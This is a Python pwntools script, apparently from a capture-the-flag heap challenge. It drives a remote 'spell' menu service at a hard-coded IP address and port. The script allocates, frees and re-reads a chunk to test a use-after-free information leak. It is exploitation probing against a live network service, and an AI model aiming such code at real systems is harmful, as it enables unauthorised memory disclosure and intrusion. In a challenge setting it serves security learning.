#!/usr/bin/env python3
from pwn import *
import sys

context.log_level = 'info'

def connect():
    return remote('52.76.96.108', 9005)

def menu(p, choice):
    p.recvuntil(b'> ')
    p.sendline(str(choice).encode())

def create(p, idx, size, data):
    menu(p, 1)
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'size: ')
    p.sendline(str(size).encode())
    p.recvuntil(b'data: ')
    if isinstance(data, str):
        data = data.encode()
    p.send(data)
    p.recvuntil(b'spell inscribed.')

def edit(p, idx, data):
    menu(p, 2)
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'data: ')
    if isinstance(data, str):
        data = data.encode()
    p.send(data)
    p.recvuntil(b'spell rewritten.')

def banish(p, idx):
    menu(p, 3)
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'spell banished.')

def recite(p, idx):
    menu(p, 4)
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'data: ')
    # Read until newline
    data = p.recvuntil(b'\n', drop=True)
    return data

def help_cmd(p):
    menu(p, 5)
    data = p.recvuntil(b'> ', drop=True)
    return data

def exit_cmd(p):
    menu(p, 0)

# Test basic interaction
p = connect()
# Read the banner
banner = p.recvuntil(b'> ')
print("=== BANNER ===")
print(banner.decode(errors='replace'))

# Create a spell
print("\n=== Creating spell 0 ===")
create(p, 0, 16, b'AAAA\n')
print("Created spell 0")

# Recite it
print("\n=== Reciting spell 0 ===")
data = recite(p, 0)
print(f"Data: {data}")

# Banish it
print("\n=== Banishing spell 0 ===")
banish(p, 0)
print("Banished spell 0")

# Recite after banish (UAF read)
print("\n=== Reciting spell 0 after banish (UAF) ===")
data = recite(p, 0)
print(f"Data after banish: {data}")
print(f"Data hex: {data.hex()}")

# Create another spell
print("\n=== Creating spell 1 ===")
create(p, 1, 16, b'BBBB\n')
print("Created spell 1")

# Recite spell 0 again (UAF read)
print("\n=== Reciting spell 0 again ===")
data = recite(p, 0)
print(f"Data: {data}")
print(f"Data hex: {data.hex()}")

exit_cmd(p)
p.close()
